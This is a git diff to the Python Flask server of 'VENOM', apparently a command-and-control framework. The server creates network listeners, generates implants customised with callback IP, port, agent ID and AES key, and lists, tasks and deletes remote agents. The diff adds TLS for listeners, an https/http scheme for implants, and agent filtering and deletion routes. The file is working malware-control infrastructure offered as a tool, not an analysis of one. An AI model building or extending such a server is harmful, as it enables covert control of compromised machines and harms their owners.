@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import re
+from xmlrpc.client import boolean
 from flask import *
 from argparse import ArgumentParser
 from controllers.db import *
@@ -7,9 +8,10 @@ from http.server import HTTPServer
 from controllers.listener import Listener
 from controllers.jwt_utils import *
 import time
+import ssl
 from threading import Thread
 from random import choices, seed
-from string import ascii_uppercase, digits
+from string import ascii_uppercase, digits, ascii_lowercase
 import jwt
 import os
 from datetime import datetime, timedelta
@@ -17,6 +19,7 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from base64 import b64encode
 import socket as s
+from requests import get
 
 ''' TO DO: 
 1- Implement a one time registration feature (Not yet)
@@ -34,7 +37,6 @@ if __name__ == "__main__":
         'db': 'users',
         'host': 'localhost',
         'port': 27017}
-
     _LISTENERS_ = dict()
     s = s.socket(s.AF_INET, s.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
@@ -72,17 +74,10 @@ if __name__ == "__main__":
         except:
            return 'Registration failed!', 500
 
-    @app.route('/dashboard', methods=['GET'])
-    @token_required(_SECRET_)
-    def dashboard():
-        return 'Dashboard', 200
-
-
     # curl http://localhost:1337/listeners -XPOST -H "content-type: application/json" -d '{"action":"create","port":"443"}' -H "cookie: accessToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTE5NDY1NTEsImV4cCI6MTY1MTk0NzE1MSwic3ViIjoidmVub21AdmVub20ubG9jYWwifQ.2Qx4EWUe0DYcp1j4WplNpd0ddJt4L3nF6Mk19I-tl_8"
     @app.route('/listeners', methods=['GET', 'POST'])
     @token_required(_SECRET_)
     def listeners():
-        #Make this route POST only
         if(request.method == 'GET'):
             listeners = dict()
             listeners['listeners'] = []
@@ -101,6 +96,8 @@ if __name__ == "__main__":
                     if not checkListenerPort(port):
                         _LISTENERS_["listener_%s" % id] = HTTPServer(
                             ('0.0.0.0', port), Listener)
+                        if(args.ssl):
+                            _LISTENERS_["listener_%s" % id].socket = ssl.wrap_socket(_LISTENERS_["listener_%s" % id].socket, server_side=True, certfile='./SSLKeys/server.pem', keyfile='./SSLKeys/server.key',ssl_version=ssl.PROTOCOL_TLS)
                         Key = os.urandom(16)
                         base64_bytes = b64encode(Key)
                         AESKey = base64_bytes.decode("ascii")
@@ -143,6 +140,11 @@ if __name__ == "__main__":
                 implant = getImplant(type)
                 implant = implant.replace('REPLACE_IP', ip).replace(
                     'REPLACE_PORT', str(port)).replace('REPLACE_ID', agentID).replace('REPLACE_KEY', key)
+                if(args.ssl): 
+                    implant = implant.replace('REPLACE_SCHEME','https')
+                else: 
+                    implant = implant.replace('REPLACE_SCHEME','http')
+                
                 return Response(implant,  mimetype='application/octet-stream'), 200
             except:
                 return 'Listener with ID: %s not found!' % (request.json.get('id')), 206    
@@ -165,23 +167,45 @@ if __name__ == "__main__":
     @app.route('/agents', methods=['POST'])
     @token_required(_SECRET_)
     def agents(): 
+    
         status = request.json.get('status')
         agents = dict()
         agents['agents'] = []
         i = 0 
-        for agent in getAgents(): 
-            #delete default mongo objectID 
-            if(agent['status'] != status): 
-                continue
-            del agent['_id']
-            del agent['status'] 
-            del agent['task'] 
-            del agent['taskResult']
-            del agent['bindListenerID']  
-            del agent['timeout']
-            agents['agents'].append(agent)
-        return agents , 200 
+        if (status == 'all'): 
+            for agent in getAgents(): 
+                del agent['_id']
+                del agent['status'] 
+                del agent['task'] 
+                del agent['taskResult']
+                del agent['bindListenerID']  
+                del agent['timeout']
+                agents['agents'].append(agent)
+            return agents , 200 
 
+        else: 
+            for agent in getAgents(): 
+                #delete default mongo objectID 
+                if(agent['status'] != status): 
+                    continue
+                del agent['_id']
+                del agent['status'] 
+                del agent['task'] 
+                del agent['taskResult']
+                del agent['bindListenerID']  
+                del agent['timeout']
+                agents['agents'].append(agent)
+            return agents , 200 
+
+
+    @app.route('/deleteAgent', methods=['POST'])
+    @token_required(_SECRET_)
+    def deleteagent(): 
+        try: 
+            deleteAgent(request.json.get('id'))
+            return 'Agent deleted', 200
+        except:    
+            return 'Error while deleting Agent!', 200 
 
     @app.route('/venom', methods= ['POST'])
     @token_required(_SECRET_)
@@ -204,10 +228,21 @@ if __name__ == "__main__":
                 return 'Error!' , 206
 
 
+    @app.route('/getTime', methods= ['GET'])
+    @token_required(_SECRET_)
+    def getTime(): 
+        try: 
+            return get('https://timeapi.io/api/Time/current/zone?timeZone=Europe/Amsterdam').text, 200 
+        except: 
+            return 'Error getting date', 206
+
+
+
     parser = ArgumentParser(description='Welcome to VENOM')
     parser.add_argument('--port', type=int, required=True, default='8080', help='Port number, Default set to 8080')
+    parser.add_argument('--ssl', action='store_true', required=False, default=False, help='To enable SSL for Listeners, Disabled by default')
     args = parser.parse_args()
-    password = "".join(choices(digits, k = 12))
+    password = "".join(choices(ascii_lowercase + digits, k = 12))
     print("Creating a default account! ✅ ...\nEmail: venom@venom.local\nPassword: %s" % (password))
     migrate(password)
     app.run(host='0.0.0.0', port=args.port, debug=True)
